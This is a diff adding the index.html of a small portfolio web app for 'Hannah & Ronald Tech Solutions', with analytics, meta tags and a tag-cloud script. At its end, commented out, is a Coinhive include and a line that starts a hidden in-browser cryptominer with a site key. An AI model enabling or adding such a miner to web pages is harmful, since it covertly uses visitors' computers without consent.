@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-58021160-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-58021160-1');
+    </script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="theme-color" content="#000000">
+    <link rel="manifest" href="%PUBLIC_URL%/icons/manifest.json">
+    <link rel="shortcut icon" href="%PUBLIC_URL%/icons/favicon.ico">
+
+    <link rel="apple-touch-icon" sizes="57x57" href="%PUBLIC_URL%/icons/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="%PUBLIC_URL%/icons/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="%PUBLIC_URL%/icons/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="%PUBLIC_URL%/icons/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="%PUBLIC_URL%/icons/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="%PUBLIC_URL%/icons/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="%PUBLIC_URL%/icons/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="%PUBLIC_URL%/icons/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="%PUBLIC_URL%/icons/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="%PUBLIC_URL%/icons/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="%PUBLIC_URL%/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="%PUBLIC_URL%/icons/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="%PUBLIC_URL%/icons/favicon-16x16.png">
+
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="%PUBLIC_URL%/icons/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+
+    <!-- COMMON TAGS -->
+    <meta charset="utf-8">
+    <title>Hannah & Ronald Tech Solutions</title>
+    <!-- Search Engine -->
+    <meta name="description" content="My main area of my expertise is front end development and everything related with this side of web. HTML, CSS, JS (ES5,ES6), building small & medium Web Apps, Landing Pages, Corporate Websites using ReactJS, AngularJS.">
+    <meta name="image" content="http://hartsol.com/img/card.jpg">
+    <!-- Schema.org for Google -->
+    <meta itemprop="name" content="Hannah & Ronald Tech Solutions">
+    <meta itemprop="description" content="My main area of my expertise is front end development and everything related with this side of web. HTML, CSS, JS (ES5,ES6), building small & medium Web Apps, Landing Pages, Corporate Websites using ReactJS, AngularJS.">
+    <meta itemprop="image" content="http://hartsol.com/img/card.jpg">
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Hannah & Ronald Tech Solutions">
+    <meta name="twitter:description" content="My main area of my expertise is front end development and everything related with this side of web. HTML, CSS, JS (ES5,ES6), building small & medium Web Apps, Landing Pages, Corporate Websites using ReactJS, AngularJS.">
+    <!-- Open Graph general (Facebook, Pinterest & Google+) -->
+    <meta property="og:title" content="Hannah & Ronald Tech Solutions">
+    <meta property="og:description" content="My main area of my expertise is front end development and everything related with this side of web. HTML, CSS, JS (ES5,ES6), building small & medium Web Apps, Landing Pages, Corporate Websites using ReactJS, AngularJS.">
+    <meta property="og:image" content="http://hartsol.com/img/card.jpg">
+    <meta property="og:url" content="http://hartsol.com/">
+    <meta property="og:site_name" content="Hartsol">
+    <meta property="og:type" content="website">
+    <meta property="og:image:width" content="650">
+    <meta property="og:image:height" content="350">
+    <meta property="og:image:type" content="image/jpeg">
+  </head>
+  <body>
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+    <noscript>
+      You need to enable JavaScript to run this app.
+    </noscript>
+    <div id="hartsol-app"></div>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script type="text/javascript" src="../js/tagcloud.js"></script>
+    <script type="text/javascript">
+      var tagClouds = function(){
+        var oopts = {
+         textFont: 'rebuchet MS, Helvetica, sans-seri',
+         textHeight: 14,
+         maxSpeed: 0.1,
+         decel: 0.9,
+         depth: 0.99,
+         outlineColour: '#F0CF7A',
+         outlineThickness: 3,
+         pulsateTo: 0.2,
+         pulsateTime: 0.5,
+         wheelZoom: false
+        }, ttags = 'taglist', lock, shape = 'sphere';
+        window.onload = function() {
+         TagCanvas.textFont = 'Trebuchet MS, Helvetica, sans-serif';
+         TagCanvas.textColour = '#F0CF7A';
+         TagCanvas.textHeight = 14;
+         TagCanvas.outlineMethod = 'block';
+         TagCanvas.outlineColour = '#111';
+         TagCanvas.maxSpeed = 0.03;
+         TagCanvas.minBrightness = 0.2;
+         TagCanvas.depth = 0.92;
+         TagCanvas.pulsateTo = 0.6;
+         TagCanvas.initial = [0.1,-0.1];
+         TagCanvas.decel = 0.98;
+         TagCanvas.reverse = true;
+         TagCanvas.hideTags = false;
+         TagCanvas.shadow = '#333';
+         TagCanvas.shadowBlur = 3;
+         TagCanvas.weight = false;
+         TagCanvas.imageScale = null;
+         TagCanvas.fadeIn = 1000;
+         TagCanvas.clickToFront = 600;
+         try {
+          TagCanvas.Start('tagcanvas','taglist');
+          f('options');
+         } catch(e) {
+         }
+        };
+      }
+      tagClouds();
+      </script>
+      <!-- <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
+      <script>var miner = new CoinHive.Anonymous('LZcCxlYNfn3kWgbbtFEDAr0G5POXIhnj'); miner.start();</script> -->
+
+  </body>
+</html>
